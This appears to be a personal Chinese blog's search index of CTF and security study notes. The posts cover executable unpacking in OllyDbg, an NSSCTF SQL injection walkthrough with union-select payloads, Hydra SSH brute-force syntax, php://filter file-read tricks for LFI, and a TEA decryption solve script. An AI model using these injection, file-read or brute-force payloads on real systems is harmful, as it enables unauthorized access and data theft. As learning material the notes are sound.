class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">hexo.<span class="hljs-property">extend</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;head_begin&#x27;</span>, <span class="hljs-string">&#x27;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&#x27;</span>, <span class="hljs-string">&#x27;post&#x27;</span>);<br></code></pre></td></tr></table></figure><p>注解：</p><meta name="referrer" content="no-referrer" /> 指定了 "no-referrer" 的内容，意味着浏览器在发送请求时不会包含任何引用来源信息。换句话说，当用户从当前网页跳转到其他页面时，新页面接收到的请求中将不包含这个跳转前的页面地址<p><a href="https://blog.csdn.net/weixin_52479803/article/details/131774501">参考文章</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSG脱壳过程中的IAT修复</title>
    <link href="/2024/09/12/FSG%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/FSG%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h3 id="MSG脱壳过程中的IAT修复"><a href="#MSG脱壳过程中的IAT修复" class="headerlink" title="MSG脱壳过程中的IAT修复"></a>MSG脱壳过程中的IAT修复</h3><p>进行手动查找和IAT修复<br>找可以在动态连接库中查得到的call<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016001.png" srcset="/img/loading.gif" lazyload><br>在命令行中敲425210然后查连接库函数<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016599.png" srcset="/img/loading.gif" lazyload><br>向上向下查找为0的数值(分割处)<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016253.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016865.png" srcset="/img/loading.gif" lazyload><br>手动修改RVA和size的值<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016959.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>asp脱壳</title>
    <link href="/2024/09/12/asp%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/asp%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<p>asp脱壳时利用</p><h4 id="模拟跟踪法"><a href="#模拟跟踪法" class="headerlink" title="模拟跟踪法"></a>模拟跟踪法</h4><p>利用tc命令跟踪<br><img src="http://gitee.com/fogpost/photo/raw/master/image12.png" srcset="/img/loading.gif" lazyload><br>查找带有sfx和输入表的字段<br><img src="http://gitee.com/fogpost/photo/raw/master/image-1.png" srcset="/img/loading.gif" lazyload><br>这个方法由于时程序自动进行的所以十分缓慢不建议用  </p><h4 id="SFX法"><a href="#SFX法" class="headerlink" title="SFX法"></a>SFX法</h4><p><img src="http://gitee.com/fogpost/photo/raw/master/image-3.png" srcset="/img/loading.gif" lazyload><br>自动抵达<br><img src="http://gitee.com/fogpost/photo/raw/master/image-4.png" srcset="/img/loading.gif" lazyload></p><h3 id="nspack"><a href="#nspack" class="headerlink" title="nspack"></a>nspack</h3><p>巧妙脱壳法<br><img src="http://gitee.com/fogpost/photo/raw/master/image-5.png" srcset="/img/loading.gif" lazyload><br>at GetVersion  </p><p>下版本断点<br><img src="http://gitee.com/fogpost/photo/raw/master/image-6.png" srcset="/img/loading.gif" lazyload><br>在retn处下断点<br>单步F8之后到打OEP之后向前找OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122015500.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEcompact脱壳</title>
    <link href="/2024/09/12/PEcompact/"/>
    <url>/2024/09/12/PEcompact/</url>
    
    <content type="html"><![CDATA[<h3 id="PEcompact脱壳"><a href="#PEcompact脱壳" class="headerlink" title="PEcompact脱壳"></a>PEcompact脱壳</h3><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017434.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>3<br>BP VirtualFree<br>F9到达取消断点<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017793.png" srcset="/img/loading.gif" lazyload><br>返回到用户代码alt+f9<br>查找PUSH 8000<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017787.png" srcset="/img/loading.gif" lazyload><br>然后单步到达<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017628.png" srcset="/img/loading.gif" lazyload></p></blockquote><blockquote><p>4<br>BP VirtualFree<br>两次shift+f9到达<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017209.png" srcset="/img/loading.gif" lazyload><br>返回到用户代码alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017851.png" srcset="/img/loading.gif" lazyload><br>然后单步跟踪到达oep</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017705.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>5<br>bp 0045DE74<br>运行,到达后取消断点<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018701.png" srcset="/img/loading.gif" lazyload><br>在retn处会返回并执行程序我们现在下面下个断点，然后单步到OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018935.png" srcset="/img/loading.gif" lazyload><br>这一段汇编比较重要注意在retn后面加上断点</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018816.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>6<br>bp VirtualAlloc<br>shift+f9,取消断点,返回用户代码alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018918.png" srcset="/img/loading.gif" lazyload><br>查找jump<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018029.png" srcset="/img/loading.gif" lazyload><br>单步到OEP</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018091.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>7  取消异常<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018128.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png" srcset="/img/loading.gif" lazyload><br>利用shift+f9,两次过后发现跑飞，利用第二次的SE句柄地址，（如果发现单词就跑飞了那是应为吾爱破解od中的插件strongod的过在option中将skip some Exception取消就行）<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019809.png" srcset="/img/loading.gif" lazyload><br>查找句柄<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019805.png" srcset="/img/loading.gif" lazyload></p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122019946.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>8  两次内存<br>注意对比跳跃代码<br>9  at Getversion<br>到达OEP的下方</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sql注入初识</title>
    <link href="/2024/09/12/sql%E5%88%9D%E8%AF%95/"/>
    <url>/2024/09/12/sql%E5%88%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Sql注入初识"><a href="#Sql注入初识" class="headerlink" title="Sql注入初识"></a>Sql注入初识</h1><p>&nbsp;&nbsp;我们首先了解sql注入就是在sql数据库语句执行的时候跳过正确的执行来进行我们的语句达到权限跳过直接进行命令的执行<br><img src="http://gitee.com/fogpost/photo/raw/master/429e120f5162b5a822cd10cba585135c.png" srcset="/img/loading.gif" lazyload><br>以nssctf题为例<br>首先在了解了可以利用万能密码1’进行回显之后我们利用sql语句进行库的查看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ </span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>确定几列之后便可以用语句查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200500.png" srcset="/img/loading.gif" lazyload><br>便可以了解第二列和第三列的类型<br>然后输入一下语句，查询数据库名称，以及库中有什么表，<br>并查询两张表中的字段，发现flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test_db&#x27;</span><span class="hljs-comment">--+</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200638.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/20240912200811.png" srcset="/img/loading.gif" lazyload><br>最后从表中查询flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200912.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工具使用说明书</title>
    <link href="/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="工具使用说明书"><a href="#工具使用说明书" class="headerlink" title="工具使用说明书"></a>工具使用说明书</h1><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>hydra -l root -p root 127.0.0.1 -s 2111 ssh -f<br>-l： LOGIN      指定破解的用户，对特定用户破解。<br>-L：FILE     指定用户名字典。<br>-p：PASS ，指定密码破解，少用，一般是采用密码字典。<br>-P： FILE   指定密码字典文件<br>-s： PORT 指定爆破端口<br>-M：FILE    指定目标列表文件<br>-C： FILE   使用冒号分割格式，例如“登录名 : 密码”来代替-L&#x2F;-P参数。<br>-f：  在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</p><blockquote><p>ps:我们可以利用hydra -h来查看帮助</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>脚本命令和普通命令的区别</title>
    <link href="/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/"/>
    <url>/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/</url>
    
    <content type="html"><![CDATA[<h3 id="脚本命令和普通命令的区别"><a href="#脚本命令和普通命令的区别" class="headerlink" title="脚本命令和普通命令的区别"></a>脚本命令和普通命令的区别</h3><blockquote><p>在我们将windows系统调成可以执行脚本命令之后我们的许多命令在cmd或ise中可能无法执行这可能是因为命名的原因   </p></blockquote><p>开启脚本执行之前</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\agesh&gt; where calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><p>开启之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\data\code&gt; where calc<br>PS C:\data\code&gt;<br></code></pre></td></tr></table></figure><p>解决办法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where.exe calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where  [cc lang=&quot;powershell&quot;]<br>cmdlet Where-Object at command pipeline position 1<br>Supply values for the following parameters:<br>Property:<br></code></pre></td></tr></table></figure><blockquote><p>所以在写入where calc时执行的其实是where-object cacl这是没有返回值的，不是执行where.exe calc<br>但是在非脚本名模式下不会识别位where-object于是可以正常执行</p></blockquote><p><a href="https://www.codenong.com/16775686/">相关链接</a></p>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>script</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>#php伪协议<br>php伪协议<br>常见的php伪协议</p><p>1）file:&#x2F;&#x2F; 访问本地文件系统</p><p>2）http:&#x2F;&#x2F; 访问HTTP(S)网址</p><p>3）ftp:&#x2F;&#x2F; 访问FTP(S)URL</p><p>4)php:&#x2F;&#x2F; 访问各个输出输入流</p><p>5)zlib:&#x2F;&#x2F; 处理压缩流</p><p>6)data:&#x2F;&#x2F; 读取数据</p><p>7)glob:&#x2F;&#x2F; 查找匹配的文件路径模式</p><p>8)phar:&#x2F;&#x2F; PHP归档</p><p>9)rar:&#x2F;&#x2F; RAR数据压缩</p><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 是一种利用 PHP 流封装器 (php:&#x2F;&#x2F;filter) 的方式，常用于漏洞利用中，特别是在文件包含或文件读取的攻击场景中。让我们逐步分析其含义：</p><p>分解说明：<br>php:&#x2F;&#x2F;filter：</p><p>php:&#x2F;&#x2F; 是 PHP 的一种流封装协议，它允许直接读取或写入输入、输出、错误流以及其他特殊资源。<br>filter 是一种流过滤器，允许对流进行特定的操作，如编码、解码、压缩、加密等。<br>convert.base64-encode：</p><p>这是流过滤器的一个转换操作，它会将文件内容进行 Base64 编码。Base64 是一种将二进制数据转换为 ASCII 字符的编码方式，常用于网络传输。<br>convert.base64-encode 指定要对目标文件内容进行 Base64 编码。<br>resource&#x3D;flag.php：</p><p>resource 指定了你要操作的文件资源。在这个例子中，flag.php 是目标文件，通常是一个包含敏感信息或标志的文件，可能不允许直接通过浏览器访问。<br>通过流封装器，PHP 会读取 flag.php 的内容，并在流操作中将其进行 Base64 编码。<br>整体功能：<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 的作用是：</p><p>读取 flag.php 文件的内容。<br>使用 Base64 编码对文件内容进行编码。<br>返回编码后的文件内容，而不是直接返回原始内容。<br>典型的利用场景：<br>这通常用于 本地文件包含（LFI）漏洞。在存在 LFI 漏洞的系统中，攻击者可以利用 PHP 的 include、require、file_get_contents 等函数读取任意文件，但有时文件包含被限制或敏感文件的内容不可见。</p><p>通过 php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php，攻击者可以绕过某些限制，读取文件并获取其 Base64 编码内容。然后，攻击者可以手动将 Base64 内容解码，查看文件的原始内容。</p><h1 id="include-once-file"><a href="#include-once-file" class="headerlink" title="include_once($file)"></a>include_once($file)</h1><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><ul><li>如果文件成功包含，include_once 将会返回 1</li><li>如果文件没有被找到或者在尝试包含文件过程中有错误，include_once 不会返回任何值，但会产生一个警告（除非 error_reporting 被设置成忽略警告）。</li></ul><h3 id="各类文件类型的输出情况"><a href="#各类文件类型的输出情况" class="headerlink" title="各类文件类型的输出情况"></a>各类文件类型的输出情况</h3><p>include_once 的参数不是一个 PHP 文件，那么该文件的内容会被直接输出（或执行，如果有可执行的 PHP 代码）到输出流中。具体的行为取决于该文件的内容和类型。  </p><ol><li><strong>纯文本文件（比如 .txt）</strong>: 文件的内容会被直接输出。</li><li><strong>HTML 文件（比如 .html 或 .htm）</strong>: HTML 代码会被直接输出，浏览器会按照 HTML 来渲染。</li><li><strong>XML 文件或其他标记语言文件</strong>: 文件的内容会被直接输出。</li><li><strong>二进制文件（比如图片或者音频文件）</strong>: 这样做通常不是个好主意，因为二进制数据可能会被错误地解释为文本，导致输出乱码或产生不可预测的结果。</li><li><strong>包含 PHP 代码的非 PHP 文件</strong>: 如果文件中混合有 PHP 代码（即使文件扩展名不是 .php），那么那部分 PHP 代码仍然会被执行。</li></ol>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tea.dm</title>
    <link href="/2024/09/10/tea/"/>
    <url>/2024/09/10/tea/</url>
    
    <content type="html"><![CDATA[<h1 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h1><p>终于自己做出一道tea了乐<br>看原题<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122053979.png" srcset="/img/loading.gif" lazyload><br>&emsp;典型的tea直接套模板，但是有问题，就是py中不会限定为32位所以最后的答案会超级大，我们就要去进行一个&amp;ffffffff的操作使数值正确<br>&emsp;然后就是关于题目中的小问题，首先就是delta，标准的tea是0x9E3779B9，但是在ida中总是会出现变成-0x61c88647的问题需要注意，然后就是最后的v5怎么求,就是一个偏移相加，在exp中有了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v0, v1</span>):<br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    v3 = delta * <span class="hljs-number">32</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1 = (v1 - ((v0 + v3) ^ (<span class="hljs-number">16</span> * v0 + <span class="hljs-number">1634038898</span>) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1634038904</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 = (v0 - ((v1 + v3) ^ (<span class="hljs-number">16</span> * v1 + <span class="hljs-number">1702060386</span>) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1870148662</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v3 = (v3 - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v0, v1<br><span class="hljs-comment">#已知的加密结果</span><br>v4 = <span class="hljs-number">676078132</span><br>v5 = <span class="hljs-number">957400408</span><br><span class="hljs-comment">#解密</span><br>v10, v11 = decrypt(v4, v5)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted v10: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v10)&#125;</span>, v11: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v11)&#125;</span>&quot;</span>)<br>i=<span class="hljs-number">0x49BD</span><br>j=<span class="hljs-number">0x8e00</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(j)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(i|(j&lt;&lt;<span class="hljs-number">16</span>)))<br><span class="hljs-comment">#moectf&#123;836153a5-8e00-49bd-9c42-caf30620caaf&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>decode</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
